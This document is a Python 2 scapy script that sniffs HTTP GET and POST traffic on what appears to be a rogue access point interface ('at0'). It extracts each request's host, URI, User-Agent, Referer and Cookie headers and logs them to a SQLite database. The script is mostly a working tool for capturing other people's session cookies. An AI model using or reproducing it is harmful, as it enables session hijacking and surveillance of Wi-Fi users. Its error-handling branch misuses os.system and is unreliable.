#!/usr/bin/python
# coding=utf-8

from scapy.all import *
import sqlite3
import sys
import os

def myprint(packet):
    print '-'*90
    thisRecord = "\n".join(packet.sprintf("{Raw:%Raw.load%}").split(r"\r\n"))
    lines = packet.sprintf("{Raw:%Raw.load%}").split(r"\r\n")

    a_request = []

    host = ''
    uri = ''
    rtype = ''
    ua = ''
    referer = 'null'
    cookie = 'null'
    for line in lines:
        if 'HTTP/1' in line:
            rtype = line.split()[0].replace("'","")
            uri = line.split()[1]
        if 'Host' in line:
            host = line.split(': ')[1]
        if 'User-Agent' in line:
            ua = line.split(': ')[1]
        if 'Referer' in line:
            referer = line.split('Referer: ')[1]
        if 'Cookie' in line:
            cookie = line.split('Cookie: ')[1]

    try:
        cx = sqlite3.connect(sys.path[0]+"/wifihttp.db")
        cu = cx.cursor() 
        cu.execute("insert into httprec (reqtype,uri,ua,host,referer,cookie) values (?,?,?,?,?,?)", (rtype,uri,ua,host,referer,cookie))
        cx.commit()
        cu.close()
        cx.close()
    except Exception, e:
        killpid = os.system('fuser wifihttp.db').read().split(':')[1]
        os.system('kill '+killpid)

    return thisRecord

sniff(iface='at0',prn=myprint,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
